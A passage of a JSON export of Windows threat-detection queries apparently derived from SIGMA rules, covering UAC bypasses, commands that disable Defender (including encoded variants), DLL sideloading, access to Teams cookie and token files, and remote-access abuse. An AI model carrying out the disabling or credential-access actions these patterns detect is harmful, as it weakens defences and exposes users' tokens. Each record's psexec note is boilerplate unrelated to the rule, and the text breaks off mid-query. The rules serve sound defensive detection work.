            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Consent and Comctl32 - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\consent.exe\" and tgt.process.image.path contains \"\\werfault.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 640
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects requests to disable Microsoft Defender features using PowerShell commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Defender Disable Scan Feature",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"Add-MpPreference \" or tgt.process.cmdline contains \"Set-MpPreference \") and (tgt.process.cmdline contains \"DisableArchiveScanning \" or tgt.process.cmdline contains \"DisableRealtimeMonitoring \" or tgt.process.cmdline contains \"DisableIOAVProtection \" or tgt.process.cmdline contains \"DisableBehaviorMonitoring \" or tgt.process.cmdline contains \"DisableBlockAtFirstSeen \" or tgt.process.cmdline contains \"DisableCatchupFullScan \" or tgt.process.cmdline contains \"DisableCatchupQuickScan \") and (tgt.process.cmdline contains \"$true\" or tgt.process.cmdline contains \" 1 \")) or ((tgt.process.cmdline contains \"ZGlzYWJsZWFyY2hpdmVzY2FubmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVhcmNoaXZlc2Nhbm5pbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlYXJjaGl2ZXNjYW5uaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZUFyY2hpdmVTY2FubmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVBcmNoaXZlU2Nhbm5pbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlQXJjaGl2ZVNjYW5uaW5nI\" or tgt.process.cmdline contains \"ZGlzYWJsZWJlaGF2aW9ybW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGViZWhhdmlvcm1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlYmVoYXZpb3Jtb25pdG9yaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVCZWhhdmlvck1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nI\" or tgt.process.cmdline contains \"ZGlzYWJsZWJsb2NrYXRmaXJzdHNlZW4g\" or tgt.process.cmdline contains \"Rpc2FibGVibG9ja2F0Zmlyc3RzZWVuI\" or tgt.process.cmdline contains \"kaXNhYmxlYmxvY2thdGZpcnN0c2Vlbi\" or tgt.process.cmdline contains \"RGlzYWJsZUJsb2NrQXRGaXJzdFNlZW4g\" or tgt.process.cmdline contains \"Rpc2FibGVCbG9ja0F0Rmlyc3RTZWVuI\" or tgt.process.cmdline contains \"EaXNhYmxlQmxvY2tBdEZpcnN0U2Vlbi\" or tgt.process.cmdline contains \"ZGlzYWJsZWNhdGNodXBmdWxsc2Nhbi\" or tgt.process.cmdline contains \"Rpc2FibGVjYXRjaHVwZnVsbHNjYW4g\" or tgt.process.cmdline contains \"kaXNhYmxlY2F0Y2h1cGZ1bGxzY2FuI\" or tgt.process.cmdline contains \"RGlzYWJsZUNhdGNodXBGdWxsU2Nhbi\" or tgt.process.cmdline contains \"Rpc2FibGVDYXRjaHVwRnVsbFNjYW4g\" or tgt.process.cmdline contains \"EaXNhYmxlQ2F0Y2h1cEZ1bGxTY2FuI\" or tgt.process.cmdline contains \"ZGlzYWJsZWNhdGNodXBxdWlja3NjYW4g\" or tgt.process.cmdline contains \"Rpc2FibGVjYXRjaHVwcXVpY2tzY2FuI\" or tgt.process.cmdline contains \"kaXNhYmxlY2F0Y2h1cHF1aWNrc2Nhbi\" or tgt.process.cmdline contains \"RGlzYWJsZUNhdGNodXBRdWlja1NjYW4g\" or tgt.process.cmdline contains \"Rpc2FibGVDYXRjaHVwUXVpY2tTY2FuI\" or tgt.process.cmdline contains \"EaXNhYmxlQ2F0Y2h1cFF1aWNrU2Nhbi\" or tgt.process.cmdline contains \"ZGlzYWJsZWlvYXZwcm90ZWN0aW9uI\" or tgt.process.cmdline contains \"Rpc2FibGVpb2F2cHJvdGVjdGlvbi\" or tgt.process.cmdline contains \"kaXNhYmxlaW9hdnByb3RlY3Rpb24g\" or tgt.process.cmdline contains \"RGlzYWJsZUlPQVZQcm90ZWN0aW9uI\" or tgt.process.cmdline contains \"Rpc2FibGVJT0FWUHJvdGVjdGlvbi\" or tgt.process.cmdline contains \"EaXNhYmxlSU9BVlByb3RlY3Rpb24g\" or tgt.process.cmdline contains \"ZGlzYWJsZXJlYWx0aW1lbW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVyZWFsdGltZW1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"kaXNhYmxlcmVhbHRpbWVtb25pdG9yaW5nI\" or tgt.process.cmdline contains \"RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZy\" or tgt.process.cmdline contains \"Rpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg\" or tgt.process.cmdline contains \"EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nI\") or (tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA\" or tgt.process.cmdline contains \"EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA\" or tgt.process.cmdline contains \"ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA\" or tgt.process.cmdline contains \"QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA\" or tgt.process.cmdline contains \"kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA\" or tgt.process.cmdline contains \"RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 641
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Scheduled Task Creation Via Schtasks.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \" /create \") and (not (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 642
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1518"
            ],
            "name": "Detected Windows Software Discovery",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"query\" and tgt.process.cmdline contains \"\\software\\\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"svcversion\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 643
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Explorer NOUACCHECK Flag",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"/NOUACCHECK\") and (not (src.process.cmdline=\"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\" or src.process.image.path=\"C:\\Windows\\System32\\svchost.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 644
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Potential Mpclient.DLL Sideloading Via Defender Binaries",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\MpCmdRun.exe\" or tgt.process.image.path contains \"\\NisSrv.exe\") and (not (tgt.process.image.path contains \"C:\\Program Files (x86)\\Windows Defender\\\" or tgt.process.image.path contains \"C:\\Program Files\\Microsoft Security Client\\\" or tgt.process.image.path contains \"C:\\Program Files\\Windows Defender\\\" or tgt.process.image.path contains \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 645
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using ChangePK and SLUI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\changepk.exe\" and src.process.image.path contains \"\\slui.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 646
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1528"
            ],
            "name": "Potentially Suspicious Command Targeting Teams Sensitive Files",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Microsoft\\Teams\\Cookies\" or tgt.process.cmdline contains \"\\Microsoft\\Teams\\Local Storage\\leveldb\") and (not tgt.process.image.path contains \"\\Microsoft\\Teams\\current\\Teams.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 647
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects piping the password to an anydesk instance via CMD and the '--set-password' flag.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Piped Password Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"/c \" and tgt.process.cmdline contains \"echo \" and tgt.process.cmdline contains \".exe --set-password\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 648
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133",
                "t1136",
                "t1021"
            ],
            "name": "User Added to Remote Desktop Users Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \"Remote Desktop Users\" or tgt.process.cmdline contains \"Utilisateurs du Bureau \u00e0 distance\" or tgt.process.cmdline contains \"Usuarios de escritorio remoto\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 649
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon \"userinit.exe\" child processes, which could be a sign of uncommon shells or login scripts used for persistence.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1037"
            ],
            "name": "Uncommon Userinit Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\userinit.exe\" and (not tgt.process.image.path contains \":\\WINDOWS\\explorer.exe\") and (not ((tgt.process.cmdline contains \"netlogon.bat\" or tgt.process.cmdline contains \"UsrLogon.cmd\") or tgt.process.cmdline=\"PowerShell.exe\" or (tgt.process.image.path contains \":\\Windows\\System32\\proquota.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\proquota.exe\") or (tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\HDX\\bin\\cmstart.exe\" or tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\HDX\\bin\\icast.exe\" or tgt.process.image.path contains \":\\Program Files (x86)\\Citrix\\System32\\icast.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\HDX\\bin\\cmstart.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\HDX\\bin\\icast.exe\" or tgt.process.image.path contains \":\\Program Files\\Citrix\\System32\\icast.exe\") or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 650
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 2",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains 